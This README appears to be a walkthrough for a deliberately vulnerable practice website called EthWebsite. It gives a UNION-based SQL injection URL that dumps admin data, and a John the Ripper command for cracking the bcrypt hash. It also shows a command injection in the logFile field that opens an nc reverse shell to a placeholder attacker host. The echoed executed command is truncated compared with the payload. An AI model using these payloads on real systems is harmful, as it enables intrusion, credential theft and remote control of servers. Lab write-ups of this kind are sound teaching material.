# Vulnerabilities in EthWebsite Repository

## Description

This repository contains a website powered by a backend connected to a database. The website is vulnerable to various attacks, including SQL injection and command injection. Below is a detailed breakdown of the vulnerabilities and their exploitation.

## Exploitation Steps

1. **Modify /etc/hosts file**

To begin, insert the following line into the `/etc/hosts` file, including the IP address of the machine and the hostname retrieved from a file served by the FTP server:

```
<machine_IP> ethwebsite.com
```

With this modification, we can now access the website.

2. **SQL Injection**

Accessing all the available products of this e-market website is as simple as visiting the `/shop` endpoint, while fetching details for a specific product involves navigating to `/shop/{PRODUCT_NAME}`.

Exploiting the website is made possible through SQL Injection vulnerability present in the `/shop/{PRODUCT_NAME}` path.

Since the backend does a simple MySQL query:

```
SELECT * FROM products WHERE name='{PRODUCT_NAME}';
```

We can exploit it by injecting our own code. For instance, to retrieve admin data, we can use:

```
SELECT * FROM products WHERE name='smth' UNION SELECT *,NULL FROM users WHERE id='1';
```

To make this injection work, we encode it for use in a URL. Thus, the resulting URL becomes:

```
http://ethwebsite.com/shop/smth%27%20UNION%20SELECT%20%2A%2CNULL%20FROM%20users%20WHERE%20id%3D%271%20
```

Upon execution of the SQL injection, the webpage responds by providing the admin's data, which includes their id, email, username, and hashed password, secured using bcrypt encryption.

3. **Find the password from the hash**

To decipher the plaintext password from the hash, we can use tools such as John The Ripper with a wordlist, such as `rockyou.txt`. This combination allows for the brute-force or dictionary-based cracking of the hashed password.

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt password.txt
```

4. **Command Injection using Burp Suite**

With the obtained admin credentials, we can navigate to the inaccessible `/monitor` directory. This directory grants the admin privileged access to view Nginx log files, offering insights and analytics crucial for monitoring and troubleshooting server activities.

Upon clicking on each file, the website triggers a request to the backend, which includes the name of the file the admin intends to view in the request body. The backend then processes this request and executes the following command, and sends what it prints back to the admin’s page:

```
tail -n 10 /var/log/nginx/{LOG_FILE_NAME}
```

By utilizing Burp Suite, we can intercept the request sent to the backend. We can then modify the content of the request body, injecting command line instructions. For instance, we could execute a command to establish a reverse shell, granting unauthorized access to the system.

By modifying the request body from:

```
{"logFile":"access.log"}
```

to

```
{"logFile":"access.log; mkfifo fifo; nc attacker_ip 4444 < fifo | bash > fifo "}
```

The backend executes the following:

```
tail -n 10 /var/log/nginx/access.log; mkfifo fifo; nc attacker_ip 4444 < fifo | bash >
```

Now we have access to the shell.

## Conclusion

This repository highlights critical vulnerabilities in web applications, emphasizing the importance of secure coding practices and thorough testing to mitigate such risks.
